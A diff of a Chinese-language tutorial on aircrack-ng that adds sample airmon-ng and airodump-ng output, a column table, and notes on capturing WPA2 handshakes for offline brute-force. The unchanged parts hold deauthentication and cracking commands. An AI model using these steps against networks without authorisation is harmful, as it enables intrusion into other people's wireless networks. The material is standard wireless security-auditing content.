@@ -2,7 +2,7 @@
 
 `aircrack-ng` 是一个用于无线网络安全审计的工具包，主要用于捕获数据包并进行 WEP 和 WPA/WPA2 密码破解。以下是使用 `aircrack-ng` 的基本步骤：
 
-### 1. 安装 aircrack-ng
+## 1. 安装 aircrack-ng
 
 在 Kali Linux 或其他 Debian/Ubuntu 系统上，可以使用以下命令安装：
 
@@ -11,9 +11,25 @@ sudo apt update
 sudo apt install aircrack-ng
 ```
 
-### 2. 切换到监控模式
+## 2. 切换到监控模式
 
-首先，你需要将无线网卡切换到监控模式。使用以下命令：
+显示当前支持监听模式的网卡
+
+```bash
+airmon-ng
+```
+
+返回当前检测到的网卡和相关信息：
+
+```
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           88XXau          Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
+```
+
+
+
+需要将无线网卡切换到监控模式。使用以下命令：
 
 ```bash
 sudo airmon-ng start <your_wireless_interface>
@@ -21,7 +37,32 @@ sudo airmon-ng start <your_wireless_interface>
 
 其中，`<your_wireless_interface>` 是你的无线网卡名称，例如 `wlan0`。
 
-### 3. 监控网络流量
+```
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    807 NetworkManager
+   1341 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           88XXau          Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
+                (monitor mode enabled)
+```
+
+根据提示有两个进程可能造成干扰，可以根据所给命令关闭，如果没有影响可以选择不关闭。这里 NetworkManager 是桌面系统的网络管理器。
+
+```bash
+airmon-ng check kill
+# 关闭干扰进程
+```
+
+
+
+## 3. 监控网络流量
 
 使用 `airodump-ng` 监控附近的无线网络：
 
@@ -31,7 +72,31 @@ sudo airodump-ng <monitor_interface>
 
 其中，`<monitor_interface>` 是你在监控模式下的无线网卡名称（例如 `wlan0mon`）。
 
-### 4. 捕获数据包
+```
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 08:40:F3:2C:14:08  -30        1        0    0  40  780   WPA2 CCMP   PSK  500
+ 00:5C:C2:FD:EB:17  -45        2        0    0 149 1300   WPA2 CCMP   PSK  501
+ 02:5C:C2:9D:EB:16  -46        2        0    0 149 1300   WPA2 CCMP   PSK  <length:  0>
+ 00:5C:C2:FD:EB:16  -51        4        0    0  11  540   WPA2 CCMP   PSK  502
+ 02:5C:C2:2D:EB:16  -53        3        0    0  11  540   WPA2 CCMP   PSK  <length:  0>
+ 76:97:79:E3:BC:95  -54        2        0    0  40  866   WPA2 CCMP   PSK  503
+ 02:5C:C2:2C:C4:B4  -58        2        0    0  11  540   WPA2 CCMP   PSK  <length:  0>
+ 02:5C:C2:4C:C4:B4  -58        4        0    0  11  540   WPA2 CCMP   PSK  <length:  0>
+ 00:4B:F3:8A:5F:63  -61        1        0    0  11  540   WPA2 CCMP   PSK  504
+```
+
+| 符号   | 意义                                                   |
+| ------ | ------------------------------------------------------ |
+| BSSID  | AP端的MAC地址                                          |
+| PWR    | 信号强度，数字越小越好                                 |
+| \#Data | 对应的路由器的在线数据吞吐量，数字越大，数据上传量越大 |
+| CH     | 对应路由器的所在频道                                   |
+| ESSID  | 对应路由器的名称                                       |
+
+
+
+## 4. 捕获数据包
 
 当你在 `airodump-ng` 界面中看到目标网络后，记录下其 BSSID 和频道（CH）。
 
@@ -46,7 +111,13 @@ sudo airodump-ng --bssid <target_bssid> -c <target_channel> -w <output_file> <mo
 - `<output_file>`：捕获数据包的文件名。
 - `<monitor_interface>`：你的监控接口名称。
 
-### 5. 进行攻击（可选）
+
+
+这里需要持续抓包，直到抓取到客户端与AP的握手包，也就是客户端与AP重新建立连接时发送的数据包，从中可以进行**离线爆破**并找到密码。
+
+
+
+## 5. 进行攻击
 
 如果你想要捕获 WPA/WPA2 握手包，你可以执行以下步骤：
 
@@ -60,7 +131,7 @@ sudo aireplay-ng --deauth 10 -a <target_bssid> -c <client_mac> <monitor_interfac
 - `<client_mac>`：要断开连接的客户端的 MAC 地址（可选，如果不想指定，可以省略）。
 - `<target_bssid>`：目标网络的 BSSID。
 
-### 6. 破解密码
+## 6. 破解密码
 
 使用 `aircrack-ng` 破解捕获的握手数据包：
 
